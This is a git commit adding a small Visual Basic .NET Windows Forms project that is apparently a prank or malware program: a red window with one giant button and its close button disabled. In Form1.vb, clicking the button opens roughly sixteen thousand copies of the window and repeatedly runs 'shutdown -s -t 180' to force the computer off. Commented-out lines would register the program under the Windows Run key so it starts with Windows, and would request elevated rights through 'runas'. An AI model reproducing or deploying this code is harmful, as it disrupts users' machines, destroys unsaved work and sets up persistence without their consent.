836ad597cbede59768fd634c173e4c881c732a2b
alex gilders <51347019+alzxg@users.noreply.github.com>
2019-09-10 14:15:53 +1000

    Add files via upload

---
+++ rndomTestlol/Form1.Designer.vb
@@ -0,0 +1,61 @@
+﻿<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
+Partial Class Form1
+    Inherits System.Windows.Forms.Form
+
+    'Form overrides dispose to clean up the component list.
+    <System.Diagnostics.DebuggerNonUserCode()> _
+    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
+        Try
+            If disposing AndAlso components IsNot Nothing Then
+                components.Dispose()
+            End If
+        Finally
+            MyBase.Dispose(disposing)
+        End Try
+    End Sub
+
+    'Required by the Windows Form Designer
+    Private components As System.ComponentModel.IContainer
+
+    'NOTE: The following procedure is required by the Windows Form Designer
+    'It can be modified using the Windows Form Designer.  
+    'Do not modify it using the code editor.
+    <System.Diagnostics.DebuggerStepThrough()> _
+    Private Sub InitializeComponent()
+        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(Form1))
+        Me.b = New System.Windows.Forms.Button()
+        Me.SuspendLayout()
+        '
+        'b
+        '
+        Me.b.BackColor = System.Drawing.Color.Lime
+        Me.b.Font = New System.Drawing.Font("MS Reference Sans Serif", 72.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
+        Me.b.Location = New System.Drawing.Point(47, 27)
+        Me.b.MaximumSize = New System.Drawing.Size(920, 920)
+        Me.b.MinimumSize = New System.Drawing.Size(920, 920)
+        Me.b.Name = "b"
+        Me.b.Size = New System.Drawing.Size(920, 920)
+        Me.b.TabIndex = 0
+        Me.b.Text = "☐☐☐☐?"
+        Me.b.UseVisualStyleBackColor = False
+        '
+        'Form1
+        '
+        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
+        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
+        Me.BackColor = System.Drawing.Color.Red
+        Me.ClientSize = New System.Drawing.Size(1008, 985)
+        Me.Controls.Add(Me.b)
+        Me.ForeColor = System.Drawing.Color.Red
+        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
+        Me.MaximumSize = New System.Drawing.Size(1024, 1024)
+        Me.MinimumSize = New System.Drawing.Size(1024, 1024)
+        Me.Name = "Form1"
+        Me.Text = "no"
+        Me.TransparencyKey = System.Drawing.Color.White
+        Me.ResumeLayout(False)
+
+    End Sub
+
+    Friend WithEvents b As Button
+End Class
---
+++ rndomTestlol/Form1.vb
@@ -0,0 +1,34 @@
+﻿Public Class Form1
+    Dim ProcID As Integer
+    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles b.Click
+        For X = 0 To 32767 Step 2
+            Dim oForm As Form1
+            oForm = New Form1()
+            oForm.Show()
+            oForm = Nothing
+            System.Diagnostics.Process.Start("shutdown", "-s -t 180")
+        Next X
+
+    End Sub
+    Private Const CP_NOCLOSE_BUTTON As Integer = &H200
+    Protected Overloads Overrides ReadOnly Property CreateParams() As CreateParams
+        Get
+            Dim myCp As CreateParams = MyBase.CreateParams
+            myCp.ClassStyle = myCp.ClassStyle Or CP_NOCLOSE_BUTTON
+            Return myCp
+        End Get
+    End Property
+    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+        Dim more As New Form
+        Dim rn As New Random
+        Me.Location = New Point(rn.Next(0, 999), rn.Next(0, 999))
+        'My.Computer.Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).SetValue(Application.ProductName, Application.ExecutablePath)
+    End Sub
+
+    Private Sub ok(sender As Object, e As EventArgs) Handles b.TextChanged
+
+    End Sub
+    '    Private Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecute" (ByVal hWnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
+    'Const SW_SHOWNORMAL = 1
+    'ShellExecute 0, "runas", "c:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\", Command, vbNullString, SW_SHOWNORMAL
+End Class
